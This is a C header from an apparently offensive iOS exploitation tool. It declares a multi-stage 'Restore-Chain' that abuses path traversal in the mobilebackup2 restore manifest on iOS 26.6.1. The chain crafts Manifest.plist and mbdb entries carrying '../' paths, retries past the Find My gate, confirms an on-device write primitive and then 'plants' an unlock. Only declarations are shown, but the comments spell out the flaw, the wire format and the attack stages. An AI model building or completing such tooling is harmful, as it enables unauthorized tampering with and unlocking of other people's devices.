#ifndef BACKUP_MB2_RESTORE_H
#define BACKUP_MB2_RESTORE_H

#include "l0fck.h"
#include <libimobiledevice/mobilebackup2.h>
#include <stdbool.h>

/*
 * Restore-Chain (Menu 6.8) — com.apple.mobilebackup2 restore-staging path
 * traversal (CVE-2026-84598 class, pre-patch state on iOS 26.6.1).
 *
 * Source of truth: RESEARCH/IMPORTANT TO CHECK/research-2026-09-16-afc-26.6.1.md
 * (Session 3: restore flow accepts host-supplied manifest paths without
 * path-validation at parse time; anti-theft gate MBErrorDomain/211 requires
 * Find My disabled; mb2 daemon can wedge and only recovers on reboot).
 */

#define MB2_SERVICE_NAME            "com.apple.mobilebackup2"
#define MB2_GATE_FIND_MY_CODE       211   /* MBErrorDomain/211: "Find My iPhone must be disabled" */
#define MB2_RETRY_ROUNDS            3
#define MB2_RECEIVE_TIMEOUT_MS      20000
#define MB2_MANIFEST_VERSION        "8.0"
#define MB2_SYS_DOMAINS_VERSION     "19.0"
#define MB2_MBDV_MAJOR              1
#define MB2_DUMPDIR                 "/tmp/l0fck-restore"

/* Staged-file entry for a crafted restore manifest */
typedef struct {
    char domain[128];
    char path[256];      /* host-supplied; may carry ../ traversal or domain escape */
    char content[4096];
    uint32_t len;
} mb2_staged_file_t;

typedef struct {
    bool stage0_preflight;
    bool stage1_mb2_connected;
    bool stage2_manifest_served;
    bool stage3_gate_passed;      /* got past MBErrorDomain/211 */
    int  stage3_gate_rounds;
    bool stage4_write_confirmed;  /* HARD GATE: staged file verified on-device */
    char stage4_confirmed_path[256];
    bool stage5_unlock_planted;
    bool stage6_finalized;
    bool completed;
    char last_error[256];
} restore_chain_status_t;

/* --- Host-testable synthesizers (no device required) --- */

/* Build Manifest.plist bytes (binary plist). Schema that passes on 26.6.1:
 * Version "8.0" (float-parsed), SystemDomainsVersion "19.0". */
int mb2_synthesize_manifest_plist(uint8_t **out, size_t *out_len);

/* Build Manifest.mbdb bytes for the given entries.
 * Wire format: "mbdb" + u32 LE major + u16 count + per-entry
 * (domain, path, linktarget, datahash, unknown, mode, inode, uid, gid,
 *  atime, mtime, ctime, len, flags, props) + footer (count + 0xffffffff). */
int mb2_synthesize_mbdb(const mb2_staged_file_t *entries, size_t count,
                        uint8_t **out, size_t *out_len);

/* Parse an mbdb image back into entries (validation helper).
 * Returns 0 on success; *out_count receives the parsed entry count. */
int mb2_parse_mbdb(const uint8_t *data, size_t len,
                   mb2_staged_file_t **out_entries, size_t *out_count);
void mb2_free_mbdb_entries(mb2_staged_file_t *entries);

/* Deterministic canary payload for write-confirmation probing. */
void mb2_canary_content(char *buf, size_t buf_len, const char *tag);

/* --- Live chain (device required) --- */

/* Open mb2 service + DL version exchange + MB2 Hello exchange.
 * Detects the wedge condition (silent daemon) with a bounded wait. */
int restore_mb2_open_session(l0fck_session_t *sess, mobilebackup2_client_t *out_client);

/* Full Restore-Chain: preflight -> mb2 session -> manifest serving ->
 * 211-gate retry loop -> write confirmation (hard gate) -> unlock planting
 * -> finalization. Returns 0 on full unlock, 2 when the write primitive
 * could not be confirmed (stages after stage 4 do NOT run). */
int restore_chain_run(l0fck_session_t *sess, restore_chain_status_t *out_status);

/* Partial run for protocol validation: stages 0-2 only, no unlock. */
int restore_chain_probe(l0fck_session_t *sess, restore_chain_status_t *out_status);

#endif /* BACKUP_MB2_RESTORE_H */
